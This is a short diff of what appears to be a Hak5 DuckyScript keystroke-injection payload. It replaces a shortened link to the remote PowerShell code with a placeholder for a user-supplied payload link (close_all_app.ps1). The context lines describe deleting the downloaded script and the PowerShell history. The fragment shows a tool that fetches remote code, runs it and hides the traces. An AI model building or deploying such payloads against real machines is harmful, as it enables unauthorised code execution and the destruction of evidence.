@@ -18,7 +18,8 @@ REM 4. Remove Python script downloaded
 REM 5. Delete powershell history
 REM
 
-DEFINE POWERSHEL_CODE bit.ly/Hak5_Powershel_Code
+REM Reply with YOUR LINK. The Payload should be close_all_app.ps1
+DEFINE POWERSHEL_CODE YOUR_END_USER_LINK_WITH_PAYLOAD
 
 DELAY 2000
 GUI x
